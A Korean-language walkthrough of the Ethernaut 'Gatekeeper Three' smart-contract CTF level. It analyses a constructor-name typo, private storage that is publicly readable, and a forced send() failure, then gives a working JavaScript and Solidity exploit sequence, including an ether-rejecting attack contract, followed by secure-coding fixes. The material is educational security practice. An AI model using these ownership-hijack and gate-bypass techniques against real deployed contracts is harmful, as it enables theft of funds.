# Ethernaut Level 28: Gatekeeper Three - Writeup

## 문제 개요

Gatekeeper Three는 세 개의 게이트를 모두 통과해야 entrant가 될 수 있는
문제입니다.\
목표: **세 개의 게이트를 모두 통과하여 entrant로 등록되기**

------------------------------------------------------------------------

## 컨트랙트 구조 분석

### GatekeeperThree 컨트랙트

``` solidity
contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;
    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
            _;
        }
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }
}
```

### SimpleTrick 컨트랙트

``` solidity
contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }
}
```

------------------------------------------------------------------------

## 취약점 분석

### 1. construct0r() 함수의 오타

``` solidity
function construct0r() public {
    owner = msg.sender;
}
```

-   실제 constructor가 아닌 일반 함수 → 누구나 호출 가능\
-   오타를 이용한 의도적인 취약점

### 2. Private 변수의 Storage 노출

``` solidity
uint256 private password = block.timestamp;
```

-   `private`는 외부 접근만 제한 → 블록체인에서는 누구나 읽을 수 있음\
-   `web3.eth.getStorageAt()`으로 확인 가능

### 3. send() 함수의 실패 조건

``` solidity
if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false)
```

-   `send()`는 실패 시 `false` 반환 (revert 안 함)\
-   수신자가 ether를 거부하면 실패 유도 가능

------------------------------------------------------------------------

## 게이트별 우회 전략

### Gate One: 소유권과 발신자 조작

조건:\
- `msg.sender == owner`\
- `tx.origin != owner`

해결:\
- 공격 컨트랙트를 `owner`로 설정\
- 플레이어 → 공격 컨트랙트 → GatekeeperThree 순서로 호출

### Gate Two: AllowEntrance 활성화

조건:\
- `allowEntrance == true`

해결:\
- `SimpleTrick`의 `password`를 storage에서 읽음\
- `getAllowance(password)` 호출

### Gate Three: Ether 전송 실패 유도

조건:\
- 컨트랙트 잔액 \> 0.001 ether\
- `send()`가 실패해야 함

해결:\
- 컨트랙트에 0.001 ether 이상 송금\
- owner(공격 컨트랙트)가 ether 수신 거부

------------------------------------------------------------------------

## 공격 구현

### 1단계: Owner 권한 획득

``` javascript
await contract.construct0r();
console.log("New owner:", await contract.owner());
```

### 2단계: Password 추출

``` javascript
await contract.createTrick();
const trickAddress = await contract.trick();
const passwordHex = await web3.eth.getStorageAt(trickAddress, 2);
const password = web3.utils.hexToNumber(passwordHex);
```

### 3단계: AllowEntrance 활성화

``` javascript
await contract.getAllowance(password);
console.log(await contract.allowEntrance()); // true
```

### 4단계: Ether 전송

``` javascript
await web3.eth.sendTransaction({
    from: player,
    to: contract.address,
    value: web3.utils.toWei("0.002", "ether")
});
```

### 5단계: 공격 컨트랙트 배포

``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function construct0r() external;
    function enter() external;
}

contract AttackGatekeeperThree {
    IGatekeeperThree public target;
    
    constructor(address _target) {
        target = IGatekeeperThree(_target);
    }
    
    // Ether 수신 거부 (Gate Three용)
    receive() external payable {
        revert("Rejecting ether");
    }
    
    function becomeOwner() external {
        target.construct0r();
    }
    
    function attack() external {
        target.enter();
    }
}
```

### 6단계: 최종 공격 실행

``` javascript
await attackContract.methods.becomeOwner().send({from: player});
await attackContract.methods.attack().send({from: player});
console.log(await contract.entrant() === player); // true
```

------------------------------------------------------------------------

## 공격 성공 결과

-   Gate One 통과: `msg.sender == owner`, `tx.origin != owner`\
-   Gate Two 통과: `allowEntrance == true`\
-   Gate Three 통과: 잔액 \> 0.001 ether, `send()` 실패\
-   최종: entrant 등록 성공

------------------------------------------------------------------------

## 취약점 분석 및 교훈

### 1. 함수명 오타의 위험성

``` solidity
// 취약한 코드
function construct0r() public { owner = msg.sender; }

// 안전한 코드
constructor() { owner = msg.sender; }
```

### 2. Private 변수의 오해

-   `private` 변수도 블록체인에선 노출됨\
-   민감한 정보는 오프체인 저장 or commit-reveal 스킴 사용

### 3. Low-level 함수 특성 이해

-   `send()`는 실패 시 false 반환\
-   `transfer()`는 실패 시 revert\
-   `call()`은 가스 제한 없음 → 권장

### 4. msg.sender vs tx.origin

-   중간 컨트랙트를 통한 우회 가능\
-   `tx.origin` 사용은 보안 취약

------------------------------------------------------------------------

## 보안 개선 방안

### 1. 적절한 Constructor 사용

``` solidity
constructor() {
    owner = msg.sender;
}
```

### 2. 안전한 비밀 정보 관리 (Commit-Reveal)

``` solidity
mapping(address => bytes32) public commitments;

function commit(bytes32 _hashedAnswer) external {
    commitments[msg.sender] = _hashedAnswer;
}

function reveal(uint256 _answer, uint256 _nonce) external {
    require(commitments[msg.sender] == keccak256(abi.encode(_answer, _nonce)));
}
```

### 3. 안전한 Ether 전송

``` solidity
(bool success, ) = payable(owner).call{value: amount}("");
require(success, "Transfer failed");
```

### 4. 권한 관리 개선

``` solidity
import "@openzeppelin/contracts/access/Ownable.sol";
contract SafeContract is Ownable {}
```

------------------------------------------------------------------------

## 결론

Gatekeeper Three는 Solidity 보안 취약점 종합 문제다.

### 배운 핵심 교훈

-   블록체인 데이터는 모두 공개\
-   정확한 constructor/제어자 사용 필요\
-   Low-level 함수(`send`, `transfer`, `call`)의 차이 이해\
-   `tx.origin` 사용의 보안 위험성

→ **스마트 컨트랙트 개발 시 세부 보안 설계 필수**
